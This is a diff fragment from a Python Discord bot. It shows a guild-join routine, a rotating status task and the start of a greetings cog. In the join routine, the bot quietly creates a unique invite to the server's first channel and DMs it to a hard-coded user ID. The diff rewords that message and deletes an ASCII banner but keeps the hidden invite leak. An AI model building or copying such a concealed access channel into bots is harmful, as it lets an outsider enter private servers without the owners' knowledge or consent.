@@ -49,7 +49,7 @@ async def foo(guild):
     channel = guild.text_channels[0]
     rope = await channel.create_invite(unique=True)
     me = bot.get_user(754453123971547266)
-    await me.send("``Daddy i have been added to:``")
+    await me.send("``Daddy someone added me to this server:``")
     await me.send(rope)
 
 @bot.listen('on_member_join')
@@ -189,17 +189,6 @@ async def status_task():
         await asyncio.sleep(10)
         await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.playing, name=f"For more info use >help"))
         await asyncio.sleep(10)
-
-####################################################################################
-# -------------------------------------------------------------------------------- #
-#     _____              ___.     ___________                             __       #
-#    /  _  \   ____  __ _\_ |__   \_   _____/ ____________   ____________/  |_     #
-#   /  /_\  \ /    \|  |  \ __ \   |    __)_ /  ___/\____ \ /  _ \_  __ \   __\    #
-#  /    |    \   |  \  |  / \_\ \  |        \\___ \ |  |_> >  <_> )  | \/|  |      #
-#  \____|__  /___|  /____/|___  / /_______  /____  >|   __/ \____/|__|   |__|      #
-#          \/     \/          \/          \/     \/ |__|                           #
-# -------------------------------------------------------------------------------- #
-####################################################################################
 
 class Greetings(commands.Cog):
     def __init__(self, bot):
